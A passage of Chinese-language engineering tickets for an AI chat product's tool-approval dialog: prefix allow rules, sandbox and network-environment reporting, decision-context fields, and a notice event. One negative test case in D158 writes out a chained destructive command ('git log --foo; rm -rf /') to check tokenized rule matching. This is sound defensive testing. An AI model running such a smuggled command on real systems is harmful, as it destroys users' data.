6. **验收判据**：① 停掉一个已注册 stdio server 后发起会用到其工具的对话 ⇒ 流/面板出现 failed 态 + 两动作，且**不是**只有 tool 失败行（断言状态帧先于 tool-result）；② 反向对照：只加 ConnectorAuthCard 挂载不加生产者 ⇒ `node scripts/check-agent-event-parity.mjs` 红（若走 SSE 路线）或组件单测找不到任何状态来源（若走 WS）——证明票面「不得给永不触发的事件写渲染器」有尺子；③ D149 的孤儿判据在挂载后翻绿（其判据方向以该票现值为准）。
7. **依赖与顺序**：生产点 → 通道 → 卡片三步硬序（票面顺序复核成立）；与 D153 **共用载体决策**（同一枚拍板，两条票不得各选一路再对账）；与「尺子①」无阻挡。
8. **风险与回退**：状态噪声（每次工具调用都提示未连接）——去重：同 server 同 state 每会话至多一条，且只在「本次对话会用到该 server 的工具」时升级为对话内行；回退=摘渲染保状态表。§24 拍板预填：① 载体 = **WS 常连**（理由：状态变更大多发生在无流期间，SSE 结构上接不住，见第 2 栏时序）；② OAuth completed 帧本票**不做**，待交互式授权入口立项；③ 降级端形态 = 状态行 + 「桌面端管理」提示。

### D155 协议通道⑤:下行告警只有一档 `budget`,配置/弃用/守护警告无通道(取证 2026-09-28,一手)。

1. **目标行为**：三类「不中断但用户必须知道」的事——配置有问题、能力要没了、自动审查发现风险——在对话里各有一句可操作的话，而不是被吞进 error 或干脆不出声。
2. **现状锚点 + 否证**：
   - budget 一档在位复核成立（contract.ts `BUDGET: 'budget'` + level warning/critical 判别成员；生产 `apps/api/src/routes/ai-chat-stream.ts:150-230/791/1058` 流首命名帧，现读）。票面「不主张新建它」照办。
   - **否证（相邻语义已有承载，本票不得重复建）**：「模型侧配置出问题的即时后果」已由 `fallback`（主模型失败切备用，含 reason）与 `retry_scheduled`（attempt/maxRetries/retryInMs/httpStatus）覆盖运行态那一半；本票的 configWarning 语义只指**静态配置体检**（如 base URL 被覆盖、凭据档缺项），与那两帧不重叠也不得并桶。
   - guardian 侧机制**部分存在但输出为零**：`apps/ai-service/app/core/guardian_context.py`（移植 codex 九个上下文片段——那是**喂提示**的，不是到人的）；能力位 `agent_guardian_review_reminder` **默认关**（`capability_matrix.py:566-572`，`reason_if_off:「guardian 复审提醒默认关…」`）⇒ 本票的 guardian 档正是把它接到用户面的唯一出口；提醒默认关属既有决策，本票不改开关语义，只建「开了之后送到哪」的通道。
   - deprecation：`git grep -niE "deprecat" HEAD -- packages/shared/src/sse apps/ai-service/app` 无面向用户的弃用通知概念（命中为第三方代码注释，未逐条定性）。`未取证:竞品三档显示文案未逐字取得`（票面自己已声明，本票维持「通道 + 我方自有语义」的判据边界，不反推界面）。
   - ⇒ 票面成立、不撤；形态按现读收窄为**一帧多档**（`notice`，`kind:'config'|'deprecation'|'guardian'`）而非三个事件名——30 名额再加三个名会让「两帧一族各写一份 payload」的漂移面翻三倍（form_request camel 整帧丢弃那一课）。
3. **改动分解**：步骤1 契约同批三处：`NOTICE: 'notice'` 入 TS/Python 两份 SSE_EVENTS + 判别成员 `{kind, messageKey, params?, action?: 'open_settings'|'review'|'none', ttlHint?}`——**message 走键不走文**（守门 74/121 同族：后端不发中文界面文案，injection_applied 的 kind→词表键模式照抄）。步骤2 生产落点（否则规则 3 永远轮不到它红，而「造好没装车」是本仓第一失效型）：config 档=会话初始化/发送前的配置体检点（开工前 `git grep -n "capability_matrix\|config.*check" HEAD -- apps/ai-service/app/core` 圈定既有体检位，无则本票不产该档、如实只登记）；guardian 档=`agent_guardian_review_reminder` 开启时的复审结论出口；deprecation 档**本票零生产点** ⇒ 按纪律**不登记该 kind**（登记而不生产=空心帧，D34 收回 settings_applied 那一型的再犯），待真有弃用清单再扩枚举。步骤3 消费：web `onNotice` + 消息流内联提示条（与 MemoryNoticeBar 同位形态，不复用 toast——会消失的提示不满足「必须知道」）；RN/小程序同条提示件降级渲染。
4. **受影响文件**：`packages/shared/src/sse/contract.ts`、`apps/ai-service/app/core/sse_contract.py`、`apps/ai-service/app/routers/llm.py`（guardian 结论位）、`apps/ai-service/app/core/capability_matrix.py`（只读定位，不改默认值）、`packages/api-client/src/client.ts`、`apps/web/src/hooks/use-chat/send-message.ts`、`apps/web/src/components/chat/message-list/**`（提示条）、`packages/app/src/**`、`apps/miniapp-taro/src/**`、五语言 shared 语言包。
5. **跨端与 i18n**：新增键：`chat.notice.config.title`「配置提醒」、`chat.notice.guardian.title`「自动审查提示」、`chat.notice.guardian.body`「本轮有一个风险判定：{{summary}}」、`chat.notice.action.review`「去查看」、`chat.notice.action.dismiss`「知道了」（kind 枚举两档与键一一对应；deprecation 档无键——无生产即无词）。
6. **验收判据**：① 打开 `AGENT_GUARDIAN_REVIEW_REMINDER=1` 造一次复审有风险结论的会话 ⇒ 端上出提示条且带「去查看」；② 反向对照 A：把生产点删掉只留 api-client 回调+web 监听 ⇒ `check-agent-event-parity.mjs` exit≠0（规则 3 生效，证明本票四件套真被接上）；③ 反向对照 B：`kind` 传未登记值 ⇒ 消费端**不渲染且不吞错**（计数上报，§五「显式未知事件计数」同条纪律），单测钉住；④ 两侧契约 parity 绿：`node scripts/check-agent-event-parity.mjs`。
7. **依赖与顺序**：可独立派（票面成立）；guardian 档依赖 `agent_guardian_review_reminder` 的既有语义（默认关不动）；优先级按票面列于本族末位，无人挡它也不挡别人。
8. **风险与回退**：提示疲劳——每 kind 每会话至多一条 + dismiss 持久化（会话级）；回退=摘渲染（契约名可留，但**下一票若清帧须连契约一起清**，防 D34 空心帧）。§24 拍板预填：① 档位取 **两档起步**（config + guardian；deprecation 无生产点故**不入枚举**——这是对竞品三档与守门「契约 ⊆ 生产」纪律冲突处选后者的明示）；② 文案归属：界面词全部出自五语言词表，后端只发 `kind+params`，该边界写进 payload 注释。

## 族 · 审批与队列的决策信息面（D158 D159 D161 D162）

> 取证口径：以下每条锚点均为本会话 `git show HEAD:<path>` / `git grep HEAD` 现读；`未取证:` 标记处禁止当事实派单。
> 本轮对票面最重要的一处推翻：**我方不是"只有三档、无规则生成"** —— 前缀放行规则的存储、匹配、撤销、枚举、过期
> 五件套已在库（`approval_persistence.py` + `mcp_server.py`），缺的只是**审批弹窗上的第四个档位与规则面板**。
> 这直接改变 D158 的射程：由"造机制"缩为"接线 + 给 UI + 给撤销入口"，且**禁止**新建第二份规则存储。

### D158 审批缺第四档「批准并生成放行规则」,用户只能一次次重批同类命令

1. **目标行为**：用户对一条命令点"批准"时，可以顺手选"以后这类命令不再问我"，之后同类命令直接执行；
   并且能在一个界面里看到"我现在放行过哪些规则、这条是哪一次批准产生的、怎么撤销"。

2. **现状锚点（全部现读）**
   - 档位面：`packages/types/src/ai.ts:55` `export type ToolApprovalScope = 'once' | 'session' | 'always'`（三档，确证）。
   - 弹窗面：`apps/web/src/components/ai/tool-approval-dialog.tsx:160` 默认 `'once'`；`:167-170` `SCOPE_OPTIONS` 恰三条
     （labelKey `scopeOnce`/`scopeSession`/`scopeAlways`）；`:238` map 渲染；`:83` `handleDecision(decision, scope, reason)`。
   - **规则存储已存在（推翻票面"只有授权作用域、无规则生成"）**：`apps/ai-service/app/services/approval_persistence.py`
     `:48 KIND_EXEC_PREFIX = "exec_prefix" # 前缀放行类(对齐 _exec_allowed_prefixes)`、`:112-116` 表结构
     `UNIQUE(scope, cache_key, kind)` + `expires_at`、`:133 normalize_exec_key(command_tokens)`、`:171 grant(scope, cache_key, kind)`
     （`:182` kind 值域 `'exec_prefix' | 'exec_once' | 'mcp_tool'`）、`:211 check()`（`:212` "always 优先于 session"）、
     `:256 revoke(cache_key, kind)`、`:272 list_keys(kind)`、`:298 purge_expired()`、`:87 _iso_plus_ttl()`（TTL 机制在位）。
   - **规则生成/匹配/撤销的调用面也已存在**（MCP exec 路径）：`apps/ai-service/app/services/mcp_server.py:2046
     approve_exec_prefix(command, tokens: int = 2)`、`:2066` "批 51b：双写持久层(always 档)"、`:2117 _matches_exec_prefix`、
     `:2155 list_exec_prefix_rules() -> list[list[str]]`、`:2160 revoke_exec_prefix(prefix)`、`:2238 _exec_approved =
     _consume_exec_approval(command) or _matches_exec_prefix(command)`。
   - 命令切词器（规则必须按 token 生成，不得按字符串前缀）：`apps/cli/src/tools/command-policy/index.ts:13-16`
     导出 `evaluateArgv` / `evaluateCommand` / `normalizeProgram` / `tokenizeCommand` / `isFileRedirectTarget` +
     `SYNTAX_TABLE`（`:17` types 含 `CommandEffect`/`OptionArity`/`SubcommandSpec`）。
   - 非等价物（不得顶账）：`permission_mode.py` 的"只读白名单"是**工具准入**那一族 —— 本会话未复验其行号，
     `未取证: permission_mode.py:372/429 具体行号未自跑（票面原文，按票面引用）`；判据用上面 exec_prefix 一组即可。
   - **未取证（开工第一步就跑它）**：web 审批链路（`apps/ai-service/app/routers/llm.py:3736 _resolve_tool_approval` /
     `:3765` 发帧）是否已经能写 `kind=exec_prefix`。现读只证到 `llm.py:228` 注释 `session_id -> {tool_name ->
     scope('session'|'always')}`（内存映射，按工具名，**不是前缀规则**）。命令：
     `git grep -n "exec_prefix\|KIND_EXEC_PREFIX" HEAD -- apps/ai-service/app/routers/llm.py apps/ai-service/app/services/agent_loop_v2.py`。

3. **改动分解**
   1. [止血] `packages/types/src/ai.ts`：`ToolApprovalScope` 保持三档**一字不动**（票面验收④"三档作用域语义不得被替换"），
      另加**独立**决策扩展 `ToolApprovalGrantRule?: { kind: 'exec_prefix'; tokens: number }`，挂在
      `ToolApprovalResponse`/请求侧新可选字段上，不改既有联合类型（根治点：档位与"是否生成规则"是两个正交维度）。
   2. [根治] `apps/ai-service/app/routers/llm.py`（审批决策处理处，紧接 `:3736` 那段）：收到带 `grantRule` 的 approve 时，
      对 `run_command` 类工具用 `command-policy` 的 `tokenizeCommand` 取 argv → `normalize_exec_key(argv[:tokens])`
      → `approval_persistence.grant(scope='always', cache_key, kind='exec_prefix')`；**禁止**在本文件重抄切词或规范化。
   3. [根治] 匹配侧：若步骤 2 的现读证明 web 路径未走 `_matches_exec_prefix`，把 `mcp_server.py:2117` 那份匹配**提成共用出口**
      （唯一候选落点 `approval_persistence.py`，因为它已有 `check`/`list_keys`），两侧同引一份；不得两处各写一遍。
   4. [止血] `apps/web/src/components/ai/tool-approval-dialog.tsx:167-170` 之后加**第四档 radio**（value 用新扩展，不是第四个
      scope 字符串），并按 `dangerLevel` + 命令风险决定是否弹二次确认（照 Trae 语义，不得默认放行）。
   5. [根治] 规则面板 [新]：`apps/web/src/components/ai/approved-rules-panel.tsx` —— 列表数据源 = `list_exec_prefix_rules()`
      + `approval_persistence.list_keys(kind)`，逐条显示"规则前缀 / 来源（哪一次批准，`created_at`）/ 过期日（`expires_at`）/
      撤销按钮（`revoke_exec_prefix` 或 `revoke(cache_key, kind)`）"。新增后端只读出口 [新] `GET /api/ai/approval-grants`
      与撤销出口 `DELETE /api/ai/approval-grants`（放在既有 ai 路由文件内，不新建路由模块）。

4. **受影响文件**
   - `packages/types/src/ai.ts`
   - `apps/ai-service/app/routers/llm.py`
   - `apps/ai-service/app/services/approval_persistence.py`（只加共用匹配出口，不改表结构）
   - `apps/ai-service/app/services/mcp_server.py`（匹配改引共用出口）
   - `apps/web/src/components/ai/tool-approval-dialog.tsx`
   - `apps/web/src/components/ai/approved-rules-panel.tsx` `[新]`
   - `packages/i18n/messages/web/{zh-CN,zh-TW,ja,ko,en}.json`
   - `apps/web/src/components/ai/__tests__/tool-approval-grant-rule.test.tsx` `[新]`

5. **跨端与 i18n**（§19 五语言同批；现读：`approval_persistence` 在服务端 ⇒ 各端弹窗都受益）
   - web：新键（挂既有 `chat` 审批命名空间旁，键名沿用弹窗现有 `t('scopeOnce')` 同层）：
     `scopeWithRule` = 「批准并生成放行规则」；`ruleTokensLabel` = 「放行范围（按命令前 {n} 段）」；
     `ruleRiskConfirm` = 「该命令风险较高。生成放行规则后，同类命令将自动执行且不再询问，风险需自行承担。是否仍要生成？」；
     `rulesPanelTitle` = 「已保存的放行规则」；`rulesPanelEmpty` = 「当前没有任何放行规则」；
     `rulesPanelSource` = 「来自 {time} 的一次批准」；`rulesPanelExpires` = 「{time} 后失效」；
     `rulesPanelRevoke` = 「撤销这条规则」；`rulesPanelRevoked` = 「已撤销：同类命令将重新询问」；
     `rulesPanelRevokeFailed` = 「撤销失败，规则仍在生效」；`rulesPanelSectionExec` = 「命令前缀」；
     `rulesPanelSectionNetwork` = 「网络目标」；`rulesPanelSectionTool` = 「工具」。
   - **§30 撤销语义分离（硬要求）**：本票所有文案一律用「撤销规则 / 放行」词族，**禁止**出现
     「恢复 / 回退 / revert / rollback / 撤销本次回答」；既有会话撤销文案 `chat.turnChanges.revert`
     （现读 = 「恢复到本轮之前」，`packages/i18n/messages/web/zh-CN.json:10508`，与 `noCheckpoints`(`:10509`) 同层）与本票**不同标签、不同按钮、不同面板**。
   - miniapp-taro / mobile-rn / `packages/app`：本轮**不做审批弹窗扩档**（现读：`git ls-files` 未见 miniapp/RN 侧
     tool-approval 弹窗同名实现；平台独占待持有人确认）⇒ 标 `单端(web) + 服务端`，其余端登记在案不做。
   - cli：`apps/cli` 走自己的 `command-policy`，已有 `approve_exec_prefix` 语义（经 mcp_server），本票**不改 cli**，只保证共用出口不漂。

6. **验收判据**
   - 正向：批准并选第四档后，同一 `run_command` 的同类命令（同前 2 段）下一轮不再产生 tool-approval 帧；
     用例断言 `grant(...)` 被调用且 `check(cache_key,'exec_prefix') == 'always'`。
   - 正向：规则面板能列出该条并点名来源时刻；点撤销后同类命令**重新弹窗**（`revoke` 生效）。
   - **反向对照 1**：把生成规则改成按命令**字符串前缀**存（不经 `tokenizeCommand`）⇒ 用例必须红：
     `git log --foo; rm -rf /` 的第二段不得被第一段放行（argv 切分判据）。
   - **反向对照 2**：把三档任一 labelKey 删掉或改成第四档 ⇒ `tool-approval-scope-once/session/always`
     三个 testid 必须仍齐全（现读 `tool-approval-dialog.tsx:46` `data-testid={\`tool-approval-scope-${opt.value}\`}`）。
   - 语言包：`node scripts/check-i18n-keys.mjs --staged`（parity + 零死 key + 同层重复键）exit 0。

7. **依赖与顺序**：可独立派（票面已注"可独立派"）。开工第一步 = 跑第 2 栏末尾那条 `exec_prefix` 接线现读；
   若结论是"web 路径完全不进 approval_persistence"，则步骤 2/3 为本票内子任务，不外包。
   与 D159 同屏但**动作不同**（D159 改信息展示，本票改决策档位），不得互顶。

8. **风险与回退** — **需 §24 拍板**（新增对外能力 + 改变用户可见行为）。爆炸半径：一旦前缀规则放得过宽，
   同类命令从此静默执行。**可直接批准的预填档位表**：
   | 档位 | 落在哪 | kind | cache_key 生成 | 作用域 | 默认 TTL | 撤销入口 |
   | --- | --- | --- | --- | --- | --- | --- |
   | 允许一次（现有，不动） | scope=once | 不写库 | — | 仅本次 | — | 无需 |
   | 允许此对话（现有，不动） | scope=session | 工具名+参数归一 | `exec_once`/`mcp_tool` | 会话内，重启失效 | 会话 | 无需（自动失效） |
   | 始终允许（现有，不动） | scope=always | 同上，**精确匹配不放大** | `exec_once`/`mcp_tool` | 跨会话 | `expires_at`（现读 `_iso_plus_ttl`） | 规则面板「工具」分节 |
   | **批准并生成放行规则（新增）** | 第四档，不改 scope 联合 | `exec_prefix` | `normalize_exec_key(tokenizeCommand(argv)[:tokens])`，**tokens 默认 2**（程序+子命令，与 `mcp_server.py:2046` 现值一致，不得单方面改） | **仅当前工作区 + 仅 `run_command` 族**，不跨工具、不跨仓 | **90 天**（到期回落到询问，复用 `purge_expired`） | 规则面板「命令前缀」分节单条撤销 |
   风险命令（`dangerLevel='high'` 或 `evaluateCommand` 判出写/删效果）**强制**走 `ruleRiskConfirm` 二次确认，且确认框
   必须原样显示生成的前缀（不是原命令），让用户对"以后放行的是什么"负责。
   回退：整条第四档由 `IHUI_APPROVAL_GRANT_RULE=0` 关闭（默认开），关档时弹窗退回现读三档形态、
   已生成规则**保留但不匹配**（不静默删数据）；代码回退 = `git revert`（禁用 reset，§22）。

### D159 审批弹窗不显示执行环境（沙箱内/外、被拦的网络目标）

1. **目标行为**：点"允许"之前，用户能在弹窗里读出三件事实——这次命令**在哪儿跑**、**能改哪些路径**、
   **网络通不通 / 哪个目标被拦了**；读不到就明写"未上报"，绝不用一句通用文案冒充。

2. **现状锚点（全部现读）**
   - 载荷侧字段集：`packages/types/src/ai.ts` `interface ToolApprovalRequest` = `approvalId / toolName / toolCallId /
     argsPreview / dangerLevel / sessionId`（`:40-90` 段整读），**无环境/网络/路径任何字段** ⇒ 这是本票的真缺口。
   - 发帧侧：`apps/ai-service/app/routers/llm.py:3736` `_resolve_tool_approval`、`:3765` 发 tool-approval SSE 帧、
     `:165` 注释声明 payload 与 agent 任务流同形；`apps/ai-service/app/core/sse_contract.py:46` 同一条注释。
   - 渲染侧：`apps/web/src/components/ai/tool-approval-dialog.tsx:215-245` 只画 toolName + dangerLevel 徽章 +
     `argsPreview`（`<pre>`，最大 40 行高）+ scope 三档 radiogroup。
   - **能力在、状态不上报（本票立论，两层沙箱均现读到）**：`apps/ai-service/app/services/sandbox.py:175`
     `backend: str = "local"`、`:199-214` local/docker/ssh/modal/daytona 分派、每条结果都带 `backend=` 字段
     （`:274/:344/:352` 等）；`apps/cli/src/tools/sandbox/platform/detect.ts:24-31` `SandboxBackend`
     = `'landlock' | 'bwrap' | 'sandbox-exec' | …`、`:32 PlatformCapabilities`、`:68 detectPlatformCapabilities()`、
     `:64-65` 降级链 `landlock → bwrap → prlimit → plain` / `sandbox-exec → prlimit → plain`、`:99/:108` 把降级写进 `notes[]`。
   - 网络事实的出口已在：`apps/ai-service/app/services/network_approval.py:137 class NetworkApprovalRequest`
     （`target/host/port/protocol`，`:61-62` 默认端口 443/80）、`:189 evaluate(url)`、`:207 evaluate_detailed()`
     ⇒ **返回 `(verdict, denial_reason)`**，`:212` 注释明写"取值对齐 codex `denied_network_policy_message` 的 reason 词表"、
     `:332/:337` 模块级出口 `evaluate_network_access(_detailed)`、`:55 KIND_NET = ap.KIND_NET # == "network"`（独立 kind，`:55` 注"stats 可单独观测"）。
   - **推翻票面否证的两处**：① 票面"唯一命中是 `code-block-run.ts:58` 的一句代码注释"——该注释确证存在
     （`apps/web/src/components/ai/code-block-run.ts:58` 附近实读 `// Shell 家族(bash/sh 在沙箱白名单外,运行时由沙箱拦截)`），
     但**我方并不缺沙箱界面文案**：`packages/i18n/messages/web/zh-CN.json:7896` `ai.terminal.isolation`
     = 「命令在隔离沙箱中执行，默认不开放网络」（另有 `:12679 prefsSandboxAutoRun`、`:27170 sandboxRun`、
     `:18563 developerSandbox`）。⇒ 本票的正确射程是"**这句静态声明该升级为逐请求事实，并出现在审批弹窗上**"，
     不是从零新建文案族。② 票面"我方执行侧其实有两层沙箱"成立，本会话独立复验到同一结论。

3. **改动分解**
   1. [根治] `packages/types/src/ai.ts`：`ToolApprovalRequest` 加三可选字段 `execEnvironment?`
      （`{ inSandbox: boolean; backend: string; degraded?: boolean; degradeNote?: string }`）、
      `writablePaths?: string[]`、`blockedNetworkTargets?: Array<{ host: string; port: number; protocol: string; reason: string }>`
      —— 全部**可选**，缺省即不渲染（不得用空数组冒充"无拦截"）。
   2. [根治] `apps/ai-service/app/routers/llm.py`（`_resolve_tool_approval` 附近）+ `apps/ai-service/app/core/sse_contract.py`
      同形处：组装 payload 时**只调既有出口取值** —— `sandbox.py` 的 `backend` 结果、`detect.ts` 那份 backend 名由
      ai-service 侧自报（不得让前端猜），网络项调 `evaluate_network_access_detailed(url)` 取 `denial_reason`。
   3. [止血] `apps/web/src/components/ai/tool-approval-dialog.tsx`：在 `argsPreview` 之后、scope radiogroup 之前
      插"执行环境"区块；缺字段 ⇒ 整行不渲染；`degraded=true` ⇒ 显示 `degradeNote` 并把"沙箱内"降级成"沙箱外（能力缺失）"。
   4. [根治] `apps/web/src/components/ai/code-block-run.ts:58` 那句注释保持不动（它描述的是 bash/sh 白名单，非界面），
      但 `ai.terminal.isolation` 静态文案改为读同一次执行的上报值（读不到时保留原文案并加"（未上报）"后缀）。
   5. 类型零 `any`：三个新字段的 `reason` 词表用 `as const` 数组 + 派生联合类型，禁止 `string` 兜底。

4. **受影响文件**
   - `packages/types/src/ai.ts`
   - `apps/ai-service/app/routers/llm.py`
   - `apps/ai-service/app/core/sse_contract.py`
   - `apps/ai-service/app/services/network_approval.py`（只加"给审批弹窗用的批量目标查询"薄出口，若已有 `evaluate_detailed` 够用则不动）
   - `apps/ai-service/app/services/sandbox.py`（只加"当前 backend + 是否降级"读取出口）
   - `apps/web/src/components/ai/tool-approval-dialog.tsx`
   - `apps/web/src/components/ai/code-block-run.ts`（文案改读上报值）
   - `packages/i18n/messages/web/{zh-CN,zh-TW,ja,ko,en}.json`
   - `apps/web/src/components/ai/__tests__/tool-approval-environment.test.tsx` `[新]`
   - `apps/cli/src/tools/sandbox/platform/detect.ts`（只读，不改；派单前需确认 CLI 侧 backend 名与 ai-service 侧 `backend` 字符串是否同集合）

5. **跨端与 i18n**
   - web 新键（同审批弹窗命名空间）：`envLabel` = 「执行环境」；`envInSandbox` = 「在沙箱中运行」；
     `envOutsideSandbox` = 「在沙箱外运行」；`envBackend` = 「隔离方式：{backend}」；
     `envDegraded` = 「沙箱能力不可用，已降级为受限直跑」；`envWritablePaths` = 「可写路径」；
     `envNetworkSection` = 「网络」；`envNetworkBlocked` = 「被拦截的网络目标」；
     `envNetworkBlockedOne` = 「{host}:{port}（{reason}）」；`envNetworkOpen` = 「本次可访问外网」；
     `envNetworkOff` = 「本次不开放网络」；`envUnknown` = 「未上报（不据档位推断，请拒绝并要求重试）」；
     `envAllowTargetOnce` = 「仅本次允许该目标」；`envAllowTargetSession` = 「本次对话允许该目标」；
     `envAllowTargetAlways` = 「始终允许该目标（90 天后失效）」。
   - 跨端处置：载荷在服务端 ⇒ `miniapp-taro` / `mobile-rn` / `packages/app` / `extension` 若存在 tool-approval 消费点，
     必须同批改渲染；`未取证: 其余端是否各有审批弹窗实现（本会话只现读到 web 一份）` —— 派单第一命令
     `git grep -ln "tool-approval\|toolApproval" HEAD -- apps/miniapp-taro/src apps/mobile-rn/src packages/app/src apps/extension`。

6. **验收判据**
   - 正向：给弹窗喂 `{execEnvironment:{inSandbox:false,backend:'plain',degraded:true}}` ⇒ 必须出现「在沙箱外运行」+ 降级说明，
     且**不**出现「沙箱」字样。
   - 正向：喂 `blockedNetworkTargets:[{host:'api.example.com',port:443,protocol:'https',reason:'not_in_allowlist'}]`
     ⇒ 必须逐条点名 host:port，不得只显示"网络受限"。
   - **反向对照 1**：把 `ai.terminal.isolation` 静态文案的"未上报"后缀去掉（即读不到值时也宣称在沙箱）⇒
     `envUnknown` 用例必须红（这是"把没判写成判过了"那一型，本仓最高频失效型）。
   - **反向对照 2**：只在 `permissionFull` 档显示环境 ⇒ 本票判据要求"不得用档位代替事实"，用例须断言
     default/plan 档同样渲染；把它改成仅 full 档即红。
   - SSE 契约：`node scripts/check-agent-event-parity.mjs`（payload 双端同形）exit 0；`scripts/check-sse-dispatch-parity` 若存在一并跑。

7. **依赖与顺序**：可与「协议通道④」同批（票面），但**判的是审批时刻的可见性**，动作面不同 ⇒ 可独立派。
   前置取证两件事：(a) CLI `SandboxBackend` 名集合与 ai-service `sandbox.py` 的 `backend` 字符串集合是否一致
   （命令：`git grep -n "backend=\|backend:" HEAD -- apps/ai-service/app/services/sandbox.py` ⊕ `git show HEAD:apps/cli/src/tools/sandbox/platform/detect.ts | sed -n '24,31p'`）；
   (b) `writablePaths` 的真值来源（候选 `apps/cli/src/tools/sandbox/policy.ts`，**本会话未读该文件 ⇒ 未取证**）。
   与 D158 同屏：D158 加第四档、本票加信息区，**同一枚提交改同一文件的两处**，需按 §12 排他（同一持有人串行做）。

8. **风险与回退** — **需 §24 拍板**（改变用户可见决策信息 + 新增对外能力档位）。
   **可直接批准的预填档位表（网络放行，与 D158 同一面板、kind 分节）**：
   | 档位 | kind | scope | cache_key | 默认 TTL | 撤销入口 | 备注 |
   | --- | --- | --- | --- | --- | --- | --- |
   | 拒绝 | — | — | 不写库 | — | — | 现读已有 `reject` 按钮，不动 |
   | 允许一次（本次请求） | `exec_once` 语义同族（网络侧新用 `network` 一次性） | 不落库 | — | — | — | 最小特权默认档 |
   | 本次对话允许该目标 | `network`（`network_approval.py:55` 现读） | session | `normalize_net_key(host,port,protocol)`（`:118` 现读） | 会话 | 规则面板「网络目标」分节 | 重启失效 |
   | 始终允许该目标 | `network` | always | 同上 | **90 天** | 同上，单条撤销 | 弹窗必须把"键"原样显示成 `host:port`，不显示哈希 |
   路径授权（Trae 有 `授予路径只读/读写权限`）**本票不做**：现读我方没有任何路径级授权存储
   （`未取证: 若要做需另计一票，先证明 `approval_persistence` 的 kind 值域可扩展而不破坏 `:188` 的 `_KINDS` 校验`）。
   爆炸半径：显示"沙箱内"而实际 plain，是**误导用户放行**，比不显示更糟 ⇒ 判据必须含"读不到就说读不到"的反向对照。
   回退：`IHUI_APPROVAL_ENV_REPORT=0` 时服务端不填新字段、前端整块不渲染（回到现读形态），已入库载荷不受影响。

### D161 审批卡缺四个「决策信息字段」：为什么现在 / 为什么找我 / 可逆性 / 决定后

1. **目标行为**：弹窗不再只贴一个"高危"标签，而是回答用户的四个实际问题——为什么非得我现在定、
   为什么是我（不是自动处理）、批了之后能不能撤、批了接下来会发生什么。

2. **现状锚点（全部现读）**
   - 既有同族确证（票面"我方并非整族缺失"成立）：`apps/web/src/components/chat/conversation-list.tsx:114`
     `data-testid="attention-badge-waiting"`、`:118 t('attentionWaiting')`、`:124/:128 t('attentionUnread')`、
     `:144 export function BatchAttentionSummaryLine`、`:502` 使用；测试面
     `apps/web/src/components/chat/__tests__/conversation-attention.test.tsx:37/126/130/135`；
     键已在五语言齐（现读 `packages/i18n/messages/web/{zh-CN,zh-TW,en,ja,ko}.json:11580-11581`
     `attentionWaiting`/`attentionUnread` 全部存在）⇒ **这一族不重做**。
   - 四字段确证缺失：`git grep -niE "reversib|whyNow|whyYou|afterDecision|openContext" HEAD -- packages apps/web/src`
     命中集合实读为 `packages/app/src/features/study-plan/StudyPlanScreen.tsx:43/58/59`（`studyPlan.status.overdue`，
     与审批无关）、`packages/i18n/messages/mobile-rn|miniapp-taro/*.json` 的 `overdue`（已逾期）、
     `packages/i18n/messages/shared/en.json:815 accountDeletionWarning`（账号注销语境）—— **无一条是审批界面文案**。
   - 可逆性的**真事实源已在服务端**：`apps/ai-service/app/services/agent_loop_v2.py:707-708` 注释
     `edit_file:diff={tool,path,before=oldText,after=newText};有 checkpoint_id 时附带 rollback={kind:checkpoint,checkpoint_id,path,available:True}`、
     `:718 rollback: dict[str, Any] | None = None`、`:758-761` 构造点、`:1447-1448`（暂停/取消/失败时保存 `checkpoint_id`）、
     `:91-94` `AgentCheckpointManager` 导入、`:1483 enable_checkpoint: bool = True`。
   - 会话侧撤销既有文案（§30 的另一套语义，须与本票分离）：`packages/i18n/messages/web/zh-CN.json:10506-10510` `chat.turnChanges`
     块（实读）`revert` = 「恢复到本轮之前」（`:10508`）、`noCheckpoints` = 「无可用检查点」（`:10509`）、
     `revertConfirm` = 「…此操作不可撤销。」（`:10510`）⇒ `可逆性` 字段的取值口径**直接复用** `noCheckpoints` 的语义源，不另造词表。
   - 审批弹窗当前渲染面（要插进去的位置）：`apps/web/src/components/ai/tool-approval-dialog.tsx:215-245`
     （toolName + dangerLevel 徽章 / argsPreview / scopeLabel radiogroup / footer 两钮）。

3. **改动分解**
   1. [根治] `packages/types/src/ai.ts`：`ToolApprovalRequest` 加可选 `decisionContext?` =
      `{ whyNow?: string; whyYou?: string; reversibility?: 'reversible' | 'not-reversible' | 'unknown'; afterDecision?: string }`
      —— 值由**服务端填**（引擎已有的 reason/dangerLevel/scope + 检查点可用性），**前端禁止再拼第二份推导**。
   2. [根治] `apps/ai-service/app/routers/llm.py` `_resolve_tool_approval`（`:3736`）附近：填 `decisionContext`；
      `reversibility` 由 `AgentCheckpointManager` 对该会话当前 `checkpoint_id` 是否可用**现读**得出，
      三态必须含 `unknown`（读不到检查点状态时，禁止冒称"可撤销"）。
   3. [止血] web 弹窗：四行**条件渲染**——`字段无值 ⇒ 整行不渲染`（票面验收①，禁止空标签或"—"占位）。
   4. [根治] `在上下文中处理` 出口：跳回锚点复用既有 conversation-attention 落点
      （`conversation-list.tsx:114` 的 waiting 徽标语义），锚点必须过守门 57 的锚点漂移判据（票面验收④）。
   5. [登记] 准入声明文案（照竞品 `attention.description` 的语义）落在弹窗标题下方一行，不做独立页面。

4. **受影响文件**
   - `packages/types/src/ai.ts`
   - `apps/ai-service/app/routers/llm.py`
   - `apps/ai-service/app/services/agent_loop_v2.py`（只加"当前检查点是否可用"的只读出口，不改 checkpoint 语义）
   - `apps/web/src/components/ai/tool-approval-dialog.tsx`
   - `apps/web/src/components/chat/conversation-list.tsx`（只作跳转锚点复用，预期零改动或仅加锚点 id）
   - `packages/i18n/messages/web/{zh-CN,zh-TW,ja,ko,en}.json`
   - `apps/web/src/components/ai/__tests__/tool-approval-decision-context.test.tsx` `[新]`

5. **跨端与 i18n**（五语言同批，且 `--staged` 过 `check-i18n-keys`）
   - web 新键：`decisionWhyNow` = 「为什么现在」；`decisionWhyYou` = 「为什么找我」；
     `decisionReversibility` = 「可逆性」；`decisionAfter` = 「决定后」；
     `decisionReversibleYes` = 「可以撤销：本轮有检查点，可回到本次执行之前」；
     `decisionReversibleNo` = 「不可撤销：本次执行没有可用检查点」；
     `decisionReversibleUnknown` = 「撤销性未知：暂时读不到检查点状态」；
     `decisionAdmissionNote` = 「只有无法继续推进的判断、请求和最终验收会出现在这里。」；
     `decisionOpenInContext` = 「在上下文中处理」；`decisionOpenInContextHint` = 「原始任务、执行轮次和相关证据保持在同一上下文中」；
